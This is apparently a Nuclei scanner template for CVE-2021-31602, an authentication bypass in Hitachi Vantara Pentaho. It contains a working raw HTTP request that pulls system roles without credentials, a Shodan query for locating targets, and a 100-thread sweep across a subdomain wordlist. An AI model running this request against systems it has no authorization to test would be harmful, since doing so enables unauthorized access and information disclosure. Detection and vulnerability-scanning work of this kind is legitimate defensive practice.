id: CVE-2021-31602-1
info:
  author: pussycat0x
  description: 'An issue was discovered in Hitachi Vantara Pentaho through 9.1 and
    Pentaho Business Intelligence Server through 7.x. The Security Model has different
    layers of Access Control. One of these layers is the applicationContext security,
    which is defined in the applicationContext-spring-security.xml file. The default
    configuration allows an unauthenticated user with no previous knowledge of the
    platform settings to extract pieces of information without possessing valid credentials.


    '
  metadata:
    shodan-query: Pentaho
  name: Pentaho <= 9.1 Authentication Bypass of Spring APIs
  reference:
  - https://seclists.org/fulldisclosure/2021/Nov/13
  - https://portswigger.net/daily-swig/remote-code-execution-sql-injection-bugs-uncovered-in-pentaho-business-analytics-software
  - https://hawsec.com/publications/pentaho/HVPENT210401-Pentaho-BA-Security-Assessment-Report-v1_1.pdf
  severity: medium
  tags: cve,cve2021,pentaho,auth-bypass
requests:
- attack: sniper
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - <roleList>
    - <roles>Anonymous</roles>
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
  raw:
  - 'GET /pentaho/api/userrolelist/systemRoles?require-cfg.js HTTP/1.1

    Host: {{Subdomains}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0

    Accept-Encoding: gzip, deflate

    Accept: */*

    '
  threads: 100
